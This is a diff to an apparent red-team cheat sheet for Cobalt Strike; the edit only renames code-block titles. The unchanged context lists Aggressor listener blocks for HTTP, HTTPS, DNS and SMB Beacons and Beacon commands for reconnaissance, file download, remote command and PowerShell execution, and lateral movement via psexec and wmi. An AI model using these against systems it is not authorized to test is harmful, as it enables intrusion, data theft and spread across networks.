@@ -29,7 +29,7 @@ Start the Cobalt Strike client.
 
 Aggressor listener block for HTTP Beacon.
 
-```sh title:"Aggressor HTTP listener block"
+```sh title:"Cobalt Strike Aggressor HTTP listener block"
 listener http { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; }
 ```
 <!-- cheat
@@ -41,7 +41,7 @@ var lport
 
 Aggressor listener block for HTTPS Beacon.
 
-```sh title:"Aggressor HTTPS listener block"
+```sh title:"Cobalt Strike Aggressor HTTPS listener block"
 listener https { set Host "$domain_or_ip"; set Port "$lport"; set BindPort "$lport"; set Cert "$certificate_path"; }
 ```
 <!-- cheat
@@ -54,7 +54,7 @@ var certificate_path
 
 Aggressor listener block for DNS Beacon.
 
-```sh title:"Aggressor DNS listener block"
+```sh title:"Cobalt Strike Aggressor DNS listener block"
 listener dns { set Host "$domain"; set Port "$lport"; set BindPort "$lport"; }
 ```
 <!-- cheat
@@ -66,7 +66,7 @@ var lport
 
 Aggressor listener block for SMB Beacon.
 
-```sh title:"Aggressor SMB listener block"
+```sh title:"Cobalt Strike Aggressor SMB listener block"
 listener smb { set PipeName "$pipe_name"; }
 ```
 <!-- cheat
@@ -79,7 +79,7 @@ var pipe_name
 
 Common Beacon job controls.
 
-```sh title:"Common Beacon job controls"
+```sh title:"Cobalt Strike Common Beacon job controls"
 help
 sleep $seconds
 jobs
@@ -94,7 +94,7 @@ var job_id
 
 Common Beacon situational awareness commands.
 
-```sh title:"Common Beacon system info commands"
+```sh title:"Cobalt Strike Common Beacon system info commands"
 whoami
 hostname
 pwd
@@ -107,7 +107,7 @@ netstat
 
 Common Beacon file operations.
 
-```sh title:"Common Beacon file operations"
+```sh title:"Cobalt Strike Common Beacon file operations"
 ls $path
 cd $path
 download $file
@@ -122,7 +122,7 @@ var file
 
 Common Beacon execution commands.
 
-```sh title:"Common Beacon execution commands"
+```sh title:"Cobalt Strike Common Beacon execution commands"
 shell $command
 execute $command
 powershell $command
@@ -135,7 +135,7 @@ var command
 
 Common Beacon lateral movement commands.
 
-```sh title:"Common Beacon lateral movement commands"
+```sh title:"Cobalt Strike Common Beacon lateral movement commands"
 psexec $target $command
 wmi $target $command
 smb $target $command
